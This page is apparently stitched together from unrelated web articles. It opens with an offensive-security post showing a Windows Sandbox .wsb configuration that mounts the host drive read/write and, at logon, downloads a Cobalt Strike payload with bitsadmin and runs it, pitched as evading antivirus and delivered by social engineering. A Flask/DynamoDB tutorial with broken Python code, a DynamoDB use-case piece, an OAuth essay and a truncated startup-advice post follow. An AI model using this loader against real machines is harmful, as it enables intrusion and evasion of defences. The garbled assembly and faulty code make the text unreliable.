<p>The tl;dr of this technique is to craft a .wsb that can be executed on an endpoint, which mounts the user’s file-system, allowing us to execute the implant inside a hidden VM and bypass any AV/EDR that’s on the host. The WSB configuration also seems to be bypassing Windows Defender on the host where it’s executed. It’s not incredibly complicated but could prove useful in an engagement.</p>
<h2 id="technique">Technique</h2>
<p>To enable the sandbox on the host machine, we can simply run the following in PowerShell:</p>
<pre><code>Enable-WindowsOptionalFeature -FeatureName "Containers-DisposableClientVM" -All -Online
</code></pre>
<p>As the interactive sandbox is mainly designed for an end-user to deem if a file is malicious or not, Windows Defender is not enabled by default for obvious reasons. We can observe this below.</p>
<pre><code>PS C:\Users\WDAGUtilityAccount&gt; Get-MpComputerStatus
Get-MpComputerStatus : Provider load failure
At line:1 char:1
+ Get-MpComputerStatus
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (MSFT_MpComputerStatus:ROOT\Microsoft\...pComputerStatus) [Get-MpComputerS
   tatus], CimException
    + FullyQualifiedErrorId : HRESULT 0x80041013,Get-MpComputerStatus
</code></pre>
<p>The user can either launch a default instance of the sandbox or create a .wsb file with specific parameters. These parameters are defined by Microsoft <a href="https://techcommunity.microsoft.com/t5/windows-kernel-internals/windows-sandbox-config-files/ba-p/354902">here</a>. The WSB extension is associated with Windows Sandbox and will launch a new instance with your defined values. For example, the below configuration will run <code>cmd</code> and <code>ping</code> upon boot.</p>
<pre><code>&lt;LogonCommand&gt; 
  &lt;Command&gt;
    cmd.exe /c ping 8.8.8.8
  &lt;/Command&gt; 
&lt;/LogonCommand&gt;
</code></pre>
<p>We can also specify a folder or drive to map to, in which the guest inherits the file permissions. We can read/write to the folder:</p>
<pre><code>&lt;MappedFolders&gt; 
  &lt;MappedFolder&gt;  
    &lt;HostFolder&gt;C:\&lt;/HostFolder&gt;  
    &lt;SandboxFolder&gt;C:\Users\WDAGUtilityAccount\C_Mount&lt;/SandboxFolder&gt;  
    &lt;ReadOnly&gt;false&lt;/ReadOnly&gt;  
  &lt;/MappedFolder&gt;
</code></pre>
<p>So, if we craft a .wsb configuration file, with folders we want to access, along with a logon command we can execute an implant inside of the Windows Sandbox with full read/write access to the file-system with one click. Below is a crafted proof-of-concept WSB configuration, where the root drive (<code>C:\</code>) is mapped to <code>C:\Users\WDAGUtilityAccount\UserFiles</code>.&nbsp; On execution of the WSB file, a Cobalt Strike payload is executed from %APPDATA% inside the VM with full access to the root file system. The WSB file is also <strong>undetected on the host</strong>.</p>
<pre><code>&lt;Configuration&gt; 
  &lt;MappedFolders&gt; 
    &lt;MappedFolder&gt; 
      &lt;HostFolder&gt;C:\&lt;/HostFolder&gt; 
      &lt;SandboxFolder&gt;C:\Users\WDAGUtilityAccount\UserFiles&lt;/SandboxFolder&gt; 
      &lt;ReadOnly&gt;false&lt;/ReadOnly&gt; 
    &lt;/MappedFolder&gt; 
  &lt;/MappedFolders&gt; 
  &lt;LogonCommand&gt; 
    &lt;Command&gt;C:\Users\ping 127.0.0.1 -n 3&gt;null&amp;bitsadmin /transfer myjob /download /priority high http://192.168.0.4/cs_wsb_test.bin "%APPDATA%\cs.exe"&gt;nul&amp;start %APPDATA%\cs.exe&lt;/Command&gt; 
  &lt;/LogonCommand&gt; 
&lt;/Configuration&gt;
</code></pre>
<p>The command could be anything - I just used the one above as a placeholder. The <code>.wsb</code> extension is also registered to be handled by <code>WindowsSandbox.exe</code> - giving room to a social engineering attack encouraging a victim to execute it where it is enabled.</p>
<h2 id="conclusion">Conclusion</h2>
<p>A similar technique has been used by the infamous Maze and Ragnar locker threat actors in recent times; however, they have installed 3rd party virtualisation suites such as VMWare &amp; VBox - using Windows Sandbox bypasses the requirement for this software to be installed. To complement this technique, I created a simple Go program to find drives automatically and mounted network shares that can include as a mapped folder, to then generate a WSB based on this. This can be found <a href="https://github.com/LloydLabs/wsb-construct">here</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Unlike Django, Flask is not directly tie-up with any database. So we can use Flask with either SQL and No-SQL. And that makes the Flask framework superior among other web frameworks and most suitable for serverless architecture. In this article, I’m going to explain how to code the flask application and database as DynamoDB and deploy to AWS Lambda.</p><h2 id="introduction">Introduction</h2><p>The application architecture will look like this, First I’ve created the file resources.py where I initiate the boto3 client. And I’ve created a models.py file that holds all the class references. And finally, I have the JSON file to create the DynamoDB table automatically from the script.</p><h2 id="table-json">Table JSON</h2><p>You can also create the table directly in the AWS console but my local development
I’m using DynamoDB local instance so I’ve to reply on other technique to create the
the table in my local and one of the methods is using the awscli command.</p><pre><code>{
    "TableName": "User",
    "KeySchema": [{ "AttributeName": "email", "KeyType": "HASH" }],
    "AttributeDefinitions": [{ "AttributeName": "email", "AttributeType": "S" }],
    "ProvisionedThroughput": { "ReadCapacityUnits": 5, "WriteCapacityUnits": 5 }
  }
</code></pre><p>Once you have the JSON file you can run the below command to create the table.</p><pre><code>aws dynamodb create-table --cli-input-json file:////actual_file_path/models/create-user.json --endpoint-url http://localhost:8000
</code></pre><p>You can remove the <code>--endpoint-url</code> if you’re creating the table in AWS console.</p><h2 id="models">Models</h2><p>I’ve created the class reference for each table. One of the benefits of having this Python object is to deal with DynamoDB response in your template and code.</p><p>Also, for authentication purposes, I’ve used the flask login so that you can create authentication with this code.</p><pre><code>from flask_login import UserMixin

class User(UserMixin):
    def __init__(self):
          self.email = None
           self.first_name = None
           self.last_name = None

   def get_id(self):
        return self.VE


    def init_user(self, response):
        self.email = response["email"]["S"]

        if "first_name" in response:
            self.first_name = response["first_name"]["S"]

        return self
</code></pre><h2 id="resources">Resources</h2><p>In order to make the CRUD operation very easy i’ve created the prepare function.
That takes the args, kwargs and turn into the dict. This dict will be useful in
update operation.</p><p>And the get function nothing but make the DynamoDB call and convert into the
class object. And then you can use this class object in your template. Also you can
pass the class object to jinja2 template and use it in the template as you like.</p><pre><code>import boto3

dynamo_client = boto3.client("dynamodb")
dynamodb_resource = boto3.resource("dynamodb")
</code></pre><pre><code>def prepare_user(email, first_name=None, last_name):
    return {"email": email, "first_name": first_name, "last_name": last_name}
</code></pre><p>Main purpose of this prepare user is to create the dict that directly use in CRUD operation.</p><pre><code>def get_user(email):
    response = dynamo_client.get_item(Key={"email": {"S": email}}, TableName="User")

    if "Item" in response:
        return User().init_user(response["Item"])

    return None
</code></pre><p>you can also create the update_user and delete_user function and use it in your code.</p><h2 id="conclusion">Conclusion</h2><p>What we have seen is how to incorporate DynamoDB in our flask based project. First the
resources and the creation of the table from JSON file and then have the model class based
python reference and then finally the CRUD operation function.</p></div><p>This article published under

<p>Web-based applications face scaling due to the growth of users along with the increasing complexity of data traffic.</p>
<p>Along with the modern complexity of business comes the need to process data faster and more robustly. Because of this, standard transactional databases aren’t always the best fit.</p>
<p>Instead, databases <a href="https://www.theseattledataguy.com/dynamodb-vs-hadoop-vs-mongodb/" target="_blank" rel="noopener noreferrer" data-href="https://www.theseattledataguy.com/dynamodb-vs-hadoop-vs-mongodb/">such as DynamoDB</a> have been designed to manage the new influx of data. DynamoDB is an Amazon Web Services database system that supports data structures and key-valued cloud services. It allows users the benefit of auto-scaling, in-memory caching, backup and restore options for all their internet-scale applications using DynamoDB.</p>
<p>But why would you want to use DynamoDB and what are some examples of use cases?</p>
<p>In this post, we’ll cover just that. We will layout the benefits of using DynamoDB, and outline some use cases as well as some of the challenges.</p>
<section>

<div>
<div>
<h3>Benefits of DynamoDB for Operations</h3>
<p>First, let’s discuss why DynamoDB can be useful.</p>
<figure><img src="https://cdn-images-1.medium.com/max/1600/0*1m1LAQYbGgEV4Rmu" data-image-id="0*1m1LAQYbGgEV4Rmu" data-width="700" data-height="300"></figure>
<h4><strong>Performance and scalability</strong></h4>
<p>Those who have worked in the IT industry know that scaling databases can both be difficult and risky. DynamoDB gives you the ability to auto-scale by tracking how close your usage is to the upper bounds. This can allow your system to adjust according to the amount of data traffic, helping you to avoid issues with performance while reducing costs.</p>
<h4><strong>Access to control&nbsp;rules</strong></h4>
<p>As data gets more specific and personal, it becomes more important to have effective access control. You want to easily apply access control to the right people without creating bottlenecks in other people’s workflow. The fine-grained access control of DynamoDB allows the table owner to gain a higher level of control over the data in the table.</p>
<h4><strong>Persistence of event stream&nbsp;data</strong></h4>
<p>DynamoDB streams allow developers to receive and update item-level data before and after changes in that data. This is because DynamoDB streams provide a time-ordered sequence of changes made to the data within the last 24 hours. With streams, you can easily use the API to make changes to a full-text search data store such as Elasticsearch, push incremental backups to Amazon S3, or maintain an up-to-date read-cache.</p>
<h4><strong>Time To&nbsp;Live</strong></h4>
<p>TTL or Time-to-Live is a process that allows you to set timestamps for deleting expired data from your tables. As soon as the timestamp expires, the data that is marked to expire is then deleted from the table. Through this functionality, developers can keep track of expired data and delete it automatically. This process also helps in reducing storage and cutting the costs of manual data deletion work.</p>
<h4><strong>Storage of inconsistent schema&nbsp;items</strong></h4>
<p>If your data objects are required to be stored in inconsistent schemas, DynamoDB can manage that. Since DynamoDB is a NoSQL data model, it handles less structured data more efficiently than a relational data model, which is why it’s easier to address query volumes and offers high performance queries for item storage in inconsistent schemas.</p>
<h4><strong>Automatic data managemen</strong>t</h4>
<p>DynamoDB constantly creates a backup of your data for safety purposes which allows owners to have data saved on the cloud.</p>
</div>

<div>
<h3>5 Use Cases for DynamoDB</h3>
<p>One of the reasons people don’t use DynamoDB is because they are uncertain whether it is a good fit for their project. We wanted to share some examples where companies are using DynamoDB to help manage the larger influx and of data at high speeds.</p>
<h4><strong>Duolingo</strong></h4>
<p>Duolingo, an online learning site, uses DynamoDB to store approximately 31 billion data objects on their web server.</p>
<p>This startup has around 18 million monthly users who perform around six billion exercises using the Duolingo app.</p>
<p>Because their application has 24,000 read units per second and 3,300 write units per second<a href="https://aws.amazon.com/solutions/case-studies/duolingo-case-study-dynamodb/" target="_blank" rel="noopener noreferrer" data-href="https://aws.amazon.com/solutions/case-studies/duolingo-case-study-dynamodb/"> DynamoDB ended up being the right fit for them</a>. The team had very little knowledge about DevOps and managing large scale systems when they started. Because of Duolingo’s global usage and need for personalized data, DynamoDB is the only database that has been able to meet their needs, both in terms of data storage and DevOps.</p>
<p>Also, the fact that DynamoDB scales automatically meant that this small startup did not need to use their developers to manually adjust the size. DynamoDB has simplified as well as scaled to meet their needs.</p>
<h4><strong>Major League Baseball&nbsp;(MLB)</strong></h4>
<p>There’s a lot we take for granted when we watch a game of baseball.</p>
<p>For example, did you know there’s a Doppler radar system that sits behind home plate, sampling the ball position 2,000 times a second? Or that there are two stereoscopic imaging devices, usually positioned above the third-base line, that sample the positions of players on the field 30 times a second?</p>
<p>All these data transactions require a system that is fast on both reads and writes. The MLB uses a combination of AWS components to help process all this data. <a href="https://aws.amazon.com/solutions/case-studies/major-league-baseball-mlbam/" target="_blank" rel="noopener noreferrer" data-href="https://aws.amazon.com/solutions/case-studies/major-league-baseball-mlbam/">DynamoDB plays a key role</a> in ensuring queries are fast and reliable.</p>
<h4><strong>Hess Corporation</strong></h4>
<p>Hess Corporation, a well-known energy company, has been working on the exploration and production of natural gas and crude oil.</p>
<p>This business requires strategizing different financial planning which impacts management on the whole. To streamline their business processes, Hess turned towards DynamoDB by shifting its E&amp;P (Energy Exploration and Production) project onto AWS.</p>
<p>Now DynamoDB has helped the company in separating potential buyers’ data from business systems. Moreover, the <a href="https://www.slideshare.net/AmazonWebServices/how-hess-has-continued-to-optimize-the-aws-cloud-after-migrating-ent218-reinvent-2017" target="_blank" rel="noopener noreferrer" data-href="https://www.slideshare.net/AmazonWebServices/how-hess-has-continued-to-optimize-the-aws-cloud-after-migrating-ent218-reinvent-2017">operational infrastructure of DynamoDB</a> helps them to handle data effectively and get optimized and well-managed results.</p>
<h4><strong>GE Healthcare</strong></h4>
<p>GE is well-known for medical imaging equipment that helps in diagnostics through radiopharmaceuticals and imaging agents.</p>
<p>The company has used DynamoDB to increase customer value, enabled by cloud access, storage, and computation.</p>
<p>The <a href="https://www.youtube.com/watch?v=4EQchAPyroE" target="_blank" rel="noopener noreferrer" data-href="https://www.youtube.com/watch?v=4EQchAPyroE">GE Health Cloud</a> provides a single portal for healthcare professionals all over the US to process and share images of patient cases. This is a great advantage for diagnostics. Clinicians can improve treatments through access to this healthcare data,</p>
<h4><strong>Docomo</strong></h4>
<p>NTT Docomo, a popular mobile phone operating company, has built a reputation for its voice recognition services, which need the best performance and capacity.</p>
<p>To cater to these requirements, Docomo turned towards DynamoDB which has helped the company scale towards better performance.</p>
<p>With their growing customer base,<a href="https://aws.amazon.com/solutions/case-studies/ntt-docomo/" target="_blank" rel="noopener noreferrer" data-href="https://aws.amazon.com/solutions/case-studies/ntt-docomo/"> Docomo has brought a voice recognition architecture into use, which helps them perform better even during traffic spikes</a>.</p>
<p>Along with all these cases, advertising technology companies also rely heavily on Amazon DynamoDB to store their marketing data of different types.</p>
<p>This data includes user events, user profiles, visited links and clicks. Sometimes, this data also includes ad targeting, attribution, and real-time bidding.</p>
<p>Thus, ad tech companies require low latency, high request rate and high performance without having to invest heavily in database operations.</p>
<p>This is why companies turn towards DynamoDB. It not only offers high performance but also, with its data replication option, allows companies to deploy their real-time applications in more than one geographical location.</p>
<p>However, despite all the benefits DynamoDB isn’t always the easiest database to use when it comes to analytics.</p>

<h3>Challenges of Analyzing DynamoDB Operational Data</h3>
<p>DynamoDB’s focus is on providing fast data transactions for applications. What makes DynamoDB fast on a transaction level can actually hinder it from the perspective of analyzing data. Here are a few of the major roadblocks you will run into once you start analyzing data in DynamoDB.</p>
<h4><strong>Online Analytical Processing (OLAP)</strong></h4>
<p>Online analytical processing and data warehousing systems usually require huge amounts of aggregating, as well as the joining of dimensional tables, which are provided in a normalized or relational view of data.</p>
<p>This is not possible in the case of DynamoDB since it’s a non-relational database that works better with NoSQL formatted data tables. Besides, the general data structures for analytics aren’t always well supported in key-value databases. In turn, it can be harder to get to data and run large computations.</p>
<h4><strong>Querying and&nbsp;SQL</strong></h4>
<p>Along with OLAP processes being difficult to run on DynamoDB, due to the focus of DynamoDB being operational, DynamoDB does not interface with SQL.</p>
<p>This is a key issue because most analytical talent is familiar with SQL and not DynamoDB queries. In turn, this makes it difficult to interact with the data and ask critical analytical questions.</p>
<p>The consequences of this can be the requirement to hire developers solely to extract the data, which is expensive, or being unable to analyze the data at all.</p>
<h4><strong>Indexing is expensive</strong></h4>
<p>Another qualm when it comes to analytics is processing large data sets quickly. Often this can be alleviated with indexes.</p>
<p>In this case, the problem is that DynamoDB’s global secondary indexes require additional read and write capacity provisioned, leading to additional cost. This means that either your queries will run slower or you will incur greater costs.</p>
<p>These challenges can sometimes be a hindrance to some companies deciding whether or not they want to take on the risk of developing on DynamoDB.</p>
<figure><img src="https://cdn-images-1.medium.com/max/1600/0*8gMzPRPWnPxv2PS7" data-image-id="0*8gMzPRPWnPxv2PS7" data-width="1600" data-height="661"></figure>
<p>This is where analytics engines like <a href="https://rockset.com/sql-on-dynamodb/" target="_blank" rel="noopener noreferrer" data-href="https://rockset.com/sql-on-dynamodb/">Rockset</a> come in. They not only provide a SQL layer that makes it easy to access the operational data but also provide the ability to ingest the data into their data layer — which supports joins with data from other AWS data sources, like Redshift and S3.</p>
<p>We’ve found tools like this to be helpful because they can reduce the need for developers and data engineers who can interface with DynamoDB. Instead, you can do your analytical work and answer the important questions without being held back.</p>
<p>For those who have ever worked on an analytical team, it can be very difficult to explain to upper management why data exists, but you’re still unable to provide insights. Using layers like Rockset can take the complexity away.</p>

December 2, 2020 | https://www.scottbrady91.com/OAuth/OAuth-is-Not-User-Authorization | <a href="https://web.archive.org/web/*/https://www.scottbrady91.com/OAuth/OAuth-is-Not-User-Authorization">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div itemprop="articleBody">
<p>
In the same way that <a href="https://www.scottbrady91.com/OAuth/OAuth-is-Not-Authentication" title="OAuth is Not Authentication" target="_blank">OAuth is not authentication</a>, it <strong>also does not tell us what the user is allowed to do or represent that the user can access a protected resource</strong> (an API).
</p>
<p>
Understanding what OAuth is not is just as important as knowing what it is, in order to use it effectively.
In this article, I’m going to discuss how OAuth does not include user authorization and why user authorization rules should not live within your OAuth authorization server.
</p>
<p>
<span>TL;DR:</span> OAuth is not suitable for user authorization.
The fact that you have an access token that allows you to act on the user’s behalf does not mean that the user can perform an action.
</p>
<h2>Client Authorization (Delegation)</h2>
<p>
OAuth is an authorization protocol, but maybe a better name for it is a delegation protocol.
It is a protocol that allows a client application to request permission to access a protected resource (API) on the resource owner’s (the user’s) behalf.
</p>
<p>
Let’s take a look at the authorization process:
</p>
<ol>
<li>The client application asks the user if they can access a protected resource on their behalf (by redirecting the user to the authorization server’s authorization endpoint, specifying exactly what they would like to access (scopes))</li>
<li>The user identifies themselves to the authorization server (but remember, OAuth is not authentication; you’ll need OpenID Connect to help you with that)</li>
<li>The user authorizes the client application to access the protected resource on their behalf (using the OAuth consent process)</li>
<li>The client application is issued an access token</li>
</ol>
<p>
<strong>An access token represents that the client application has been authorized by the user</strong>.
The protected resource can look at the access token and say, “okay, Alice authorized this application to access these parts of my system on their behalf; I’ll let it through”.
However, <strong>just because Alice said it was okay does not mean that Alice is authorized to access the protected resource</strong>.
</p>
<h3>Client Authorization vs. User Authorization</h3>
<p>
Let’s break that down, using a banking system as an example:
</p>
<ul>
<li><strong>Client authorization:</strong> can this client application read Alice’s transaction history?</li>
<li><strong>User authorization:</strong> can Alice view the balance of account #123?</li>
</ul>
<p>
OAuth can handle client authorization by issuing an access token that Alice authorized.
OAuth cannot handle user authorization.
</p>
<p>
Open Banking &amp; FAPI introduce <a href="https://tools.ietf.org/html/draft-ietf-oauth-rar" target="_blank" rel="noopener">Rich Authorization Requests</a> (RAR), where a client application can ask the user to authorize a specific transaction.
But again, this is about the user consenting to the transaction, as opposed to what the user is allowed to do.
</p>
<h2>User Authorization Rules in your OAuth Authorization Server</h2>
<p>
Hopefully, it’s now clear that an OAuth access token (or an OpenID Connect identity token for that matter) does not represent the user’s permission to do something.
But what about putting user-level authorization rules within your authorization server?
After all, you already kind of have that with the user authentication process.
</p>
<h3>User-level authorization during authentication</h3>
<p>
This is where I am happy to give some ground.
Confirming that the user is authorized to use your system when they authenticate is perfectly acceptable.
For example, has the user been disabled by an administrator?
Do they still qualify to use your services?
</p>
<p>
If you decide that the authenticating user is not authorized to use your system, you simply do not let them log in.
These kinds of checks can also be performed during token generation or maybe as part of token validation (think of the introspection endpoint).
</p>
<h3>User-level authorization based on request</h3>
<p>
What breaks this is when you try and add user-level authorization per client application or protected resource.
For instance, is the user permitted to use this scope?
Are they permitted to use this client application (while OAuth is not authentication, you may see this check when using OpenID Connect)?
</p>
<p>
This would make your OAuth authorization process look like this:
</p>
<ol>
<li>The client application asks the user if they can access a protected resource on their behalf </li>
<li>The user identifies themselves to the authorization server </li>
<li>The authorization server decides if the user is authorized to access the client or protected resource</li>
<li>The user authorizes the client application to access the protected resource on their behalf</li>
<li>The client application is issued an access token</li>
</ol>
<p>
Adding another Access-Control List (ACL) to your authorization server can’t be that bad, right?
After all, it is an <em>authorization</em> server!
</p>
<p>
In my opinion, this is <strong>brittle and prone to error</strong>.
You are now back to relying on the fact that tokens were issued to represent that the user and the request have been authorized, which is not something OAuth was designed for and is a dangerous assumption to make.
</p>
<p>
Just as many attempts to use OAuth to represent user authentication have failed, I’ve seen the same happen with user authorization too many times.
The protocols just weren’t designed for it, and it’s just too easy to get wrong, especially when your token issuer is also providing SSO, issuing tokens without user interaction.
</p>
<p>
You are likely using a framework or out-of-the-box solution as your OAuth authorization server, which will want to follow the OAuth specification and issue a token to the authorized client application.
<strong>You’ll spend your time fighting the design of OAuth</strong>, and if you make a single mistake or misunderstand how your framework of choice works, then the authorization server will kick in and issue the token as the user and client have requested, just like it is meant to.
</p>
<p>
I know I’m blurring the lines between OAuth and OpenID Connect a little here, but here’s a Stack Overflow question that I think highlights the kind of bizarre scenario you could find yourself in:
</p>
<blockquote>
“I am looking [for] a way for [my authorization server] to invalidate the submitted token if the user doesn’t have access to the application in a single go, even though the challenged token might be valid if it is submitted by other application which the user has access to”
</blockquote>
<p>
While you initially wanted to have all of your user authorization rules live within your central OAuth authorization server, you will likely end up duplicating these checks into your client applications and APIs to solve these kinds of problems.
You are probably going to code yourself into a corner.
</p>
<h2>User Permissions in your OAuth Authorization Server</h2>
<p>
This is where most of my customers end up after understanding that user-level authorization is not part of the OAuth protocol and that it is not an easy fit within their OAuth authorization server.
But the desire to write all of their authorization logic and user permissions in a single place still exists, which is understandable, especially when they have already achieved that with authentication and API access by using an SSO solution that implements both OAuth and OpenID Connect.
</p>
<p>
So, what is the solution? Role-Based Access Control (RBAC)?
Stuff tokens full of user permissions?
</p>
<p>
Well, that is a story for another day and well outside of this OAuth story.
I recommend checking out Dom’s excellent article on how <a href="https://leastprivilege.com/2016/12/16/identity-vs-permissions/" target="_blank" rel="noopener">identity and permissions don’t mix within an SSO solution</a>.
For solutions, take a look at how <a href="https://www.identityserver.com/documentation/enforcer/alfa/IntroducingAlfa/" target="_blank" rel="noopener">authorization languages are evolving</a> with ALFA and how you can create authorization policies in a single place that are readable by non-developers.
</p>
<h2>The Random Stuff</h2>
<p>
This article would not be complete without collating some of the weird and wonderful loaded questions I have received on Stack Overflow or my blog.
These are often followed by a “gotcha” or a “checkmate”, or sometimes even a personal insult.
But I’ll let your imagination come up with those.
</p>
<h3>“Then why is it called an authorization code?”</h3>
<p>
The authorization code represents the user authorizing the client application on their behalf. Again, that is client authorization, not permission to add user authorization.
</p>
<h3>“Then why do people return 401 Unauthorized when you don’t have a token?”</h3>
<p>
Naming is hard.
In this use case, it would be nice to have named this status code “Unauthenticated”, but at least <a href="https://tools.ietf.org/html/rfc7235#section-3.1" target="_blank" rel="noopener">RFC 7235</a> requires that you include a <code>WWW-Authenticate</code> header alongside this status code.
</p>
<h3>“Then why is it called the Authorization header?”</h3>
<p>
Again, naming is hard. Basic Authentication also uses the Authorization header, but that doesn’t mean the user has full access or is even allowed to use the application.
You still have to check if the user is allowed to perform an action.
</p>
<h3>“Then what are scopes for?”</h3>
<p>
Scopes represent a level of access that a client application is asking for from the user.
For instance, a scope called “email.read” might mean “can I read your emails?”, or “email.send” might mean “can I send emails on your behalf?”.
Check out Auth0’s article on <a href="https://auth0.com/blog/on-the-nature-of-oauth2-scopes/" target="_blank" rel="noopener">the nature of OAuth scopes</a>.
</p>
<p>
This is a fairly common mistake to make when starting out with OAuth, so I’ll forgive you for this one.
</p>
<h3>“I still don’t believe you! Everyone does this!”</h3>
<p>
Well, that’s just, like, your opinion, man.
But it isn’t OAuth.

<p>In Segmentâ€™s early days, we hit countless problems as a founding team. And at the time, I thought those problems were unique to our own special snowflake of a founding journey. I chalked it up to us being new grads and first-time founders.</p><p>But as I've worked with more and more startups, I've realized just how wrong I was.</p><p>Over the past five years, I've made about 25 different seed-stage investments. In doing so, it's taught me a <em>LOT</em> about the common errors that startup founders make. Even across different industries and levels of experience, I see founders hitting the exact same set of problems we encountered in the early days of Segment!</p><p>This post shares a handful of the top lessons that benefit todayâ€™s early stage founders. Itâ€™s a list of the things I wish weâ€™d figured out earlier at Segment. [1]</p><p>This sounds incredibly boring... but the #1 mistake I see startups making is that they donâ€™t set goals. If you take one thing from this post, it's that you should set goals for where you want to be.</p><p>For the longest time at Segment, we didn't have goals. We moved ahead in various (often random) directions, and we would launch features consistently... but we never really set goals at all.</p><p>As we grew the company, we started to lose momentum. Teams were spending time on a bunch of stuff that frankly just didn't really matter to the overall business.</p><p>It wasn't until we hired our VP Eng, Tido, that we finally started setting focused and audacious product goals. Just by verbalizing where we wanted to go and then grading our results, our velocity improved by an order of magnitude.</p><p>I don't care if you call them OKRs, sprints, or something else entirely. Just set a deadline when you want to have something done and a metric you want to move or some other concrete result.</p><p>When early stage founders do attempt to set goals, I often see them agonize over what specific goals to choose. In practice, a "pretty good goal" is way better than "no goals at all". Perfect is the enemy of good.</p><p>If you don't yet have product-market fit, your goal should probably be getting your first 3-5 customers using the product. If you've hit the level where you now have dozens of users, your goal should be growing by an order of magnitude. It's better to get in the habit of setting and driving towards goals rather than being too worried about their exact semantics. Worst case, you just pick a better goal later.</p><p>A great set of goals answers the question: <em><strong>"what would have to be true in order for us to feel good about our progress at the end of the month?"</strong></em><em> [2]</em></p><p>If each teammate can independently answer "what are our goals for the month?" in the same way, you'll know you've succeeded. If youâ€™re looking for prior art, read <a href="https://www.amazon.com/Measure-What-Matters-Google-Foundation/dp/0525536221">Measure What Matters</a>. </p><p>If you strictly focus on making things true by a certain date, you are bound to make at least some progress towards your end result. </p><p>At the end of the day, every billion-dollar startup is really just the sum of many small deltas.</p><p>Let's get one thing straight: your investors won't know everything. But investors won't know <em>anything</em> if you don't keep them updated on how things are going.</p><p>For the longest time, we were fearful of our Segment investors, to the point that we wouldn't bother sending them emails unless they asked about us. I can say now with confidence that this was 100% the wrong approach.</p><p>We worried that investors would think that we were screwing up (true) and failing (true as well!). And while that might be the case, a founder-friendly investor won't think that way. Investors, especially angels, invested because they believe in <em>you</em>. If I didn't think a team would go somewhere, I wouldn't put money in.</p><p>With each investor, <strong>include the goals you're working towards, as well as the asks for them</strong>. I think monthly is about the right cadence for this in the early days, moving to quarterly around Series A/B time when you start partnering more with a few board members.</p><p>Simply writing the updates should clarify your own thinking tremendously. If it takes you more than 1-2h to put together an update on the most important things happening at the company, it's probably a sign that you should be doing more thinking about the big picture.</p><p>When asking for help, the things that our investors have been able to help us with evolved quite a bit over time. But here's a good rule of thumb for what to ask for:</p><ul><li><p><u>Seed/Pre-seed</u>: user-testing, intros to beta users, hiring</p></li><li><p><u>Series A</u>: hiring, early customers, go-to-market</p></li><li><p><u>Series B/C+</u>: comparables at other companies, senior/exec hires, specific expertise around things like management, infrastructure, systems, etc.</p></li></ul><p>Not all investors will be able to help with everything. But at the very least, sending them information will help you be top of mind. I've lost track of how many times a moment of serendipity where I'm catching up with an old friend has led to a meaningful conversation for a company I've invested in.</p><p>As an extra bonus, the strongest startups send these updates to everyone on their team. It's amazing how much putting the goals in writing helps everyone stay on the same page about what's most important.</p><p>One other note here: take pictures. I now wish we had far more pictures of Segment at every stage of the company. They help turn investor updates into cherished memories.</p><p>Okay, this lesson is taken directly from the YC playbook. And YET, I see so many founders (including YC founders) fail to launch their product. </p><p>If no one notices your launch... just ignore it and then launch again. If you're doing things right, you'll never run out of stuff to launch! [3]</p><p>Why is launching so important? Let me share a personal story...</p><p>We spent about 1.5 years building different iterations of analytics tools. For every iteration, we had a waitlist that users could sign up to use. We personally reached out to the users who we thought were the best fits, and then tried to set up time to use the product. </p><p>The result? Nobody cared. We had no users. We never launched. </p><p>When we finally launched Segment in it's current incarnation, we threw out that approach entirely. We put up a self-service flow, and let anyone who wanted to sign up for it.</p><p>That's when something strange happened... we attracted an entirely new set of developers who just were crawling out of the woodwork and excited to use the new product we'd built. They were coming from companies far outside of SV that we'd never heard of.</p><p>It floored me.</p><p><strong>Lesson learned: the people you happen to be talking to now are probably not the people who have the biggest problem in your space. Do everything you can to reach the folks with the biggest problem, and then, reduce any barriers they might encounter.</strong></p><p>I expect a bunch of you reading this post to ignore this advice, just like we did in the early days. It takes a certain confidence to launch something you've built and put it out there for the world to see. Ultimately though, the rewards are worth it. You'll see users coming from communities you've never even heard of.</p><p>Let me tell you a tale of two startups.</p><p><strong>Startup A</strong> is constantly putting up interesting content on their blog. Their founders are sharing product launches, engineering posts, and creatively brainstorming about what it takes to solve problems in their market.</p><p><strong>Startup B</strong> is operating in stealth. You can't find much about them online, but one of the founders reached out with a nice personalized email mentioning their funding by a top-tier VC. </p><p>Suppose you're looking for a job... do you pick Startup A or Startup B? In my experience, A almost always wins. Momentum is a compounding force.</p><p><strong>Unless you are working in a space that heavily depends on IP, you should probably be publishing more content about what you are doing.</strong> This could be open source, it could be a weekly newsletter, it could be a changelog. [4]</p><p>Whatever it is, it's going to help you both hire <em>and</em> attract customers. So much of the internet is merely about consuming, that just by putting ideas out there, youâ€™ll have a leg up on the competition.</p><p>In the early days of Segment, our <a href="https://segment.com/blog/show-hn-to-series-d/">user acquisition was powered by open source projects and blog posts</a>. But I've seen founders have success with Twitter, Substacks, Podcasts and a variety of different channels.</p><p>If you're looking for inspiration, the <a href="https://railway.app/changelog">Railway</a> and <a href="https://linear.app/changelog">Linear</a> changelogs are epic examples. Companies like <a href="https://baremetrics.com/blog/i-sold-baremetrics">Baremetrics</a> and <a href="https://buffer.com/resources/shareholder-update-q2-2020-and-july/">Buffer</a> differentiated themselves by just being open and honest. <a href="https://stripe.com/blog/globe">Stripe</a> and <a href="https://www.figma.com/blog/behind-the-feature-the-making-of-the-new-auto-layout/">Figma's blogs</a> not only share what they build, but how they built it.</p><p>There are three big inputs that all startups need to continue growing</p><ol><li><p>product capabilities</p></li><li><p>customers and users</p></li><li><p>hiring</p></li></ol><p>I've put them in roughly the order that most teams encounter them. </p><p>Startups begin with a small product that has a modicum of utility. It starts attracting a handful of customers organically. And as more and more customers start using the product, the founders realize that they need extra help to stay on top of all of those requests.</p><p>Remember though, the real goal here is #2. Itâ€™s not the size of your team, itâ€™s the value youâ€™re able to provide to the world. [5]</p><p>I see hiring a big team before you have product-market fit as a red flag. If the company doesn't yet have a set direction, it's going to be harder to pivot with 10 people than it is with 3.</p><p>But, I've worked with startups who have traction and runway... and just seem to be spinning their wheels under load from existing customers.</p><p>I get it. Hiring isn't the most fun, especially for an introvert. It's a lot of interviewing and feeling like there's a lot of rejection. Rejecting people sucks. Losing candidates sucks. For many of our roles at Segment, we've had to talk with 50-100 different people to make an eventual hire.</p><p><strong>If you have 24 months of runway, and a clear list of things youâ€™d do if you had more copies of yourself: you probably aren't spending time to hire the people you need.</strong></p><p>At Segment, 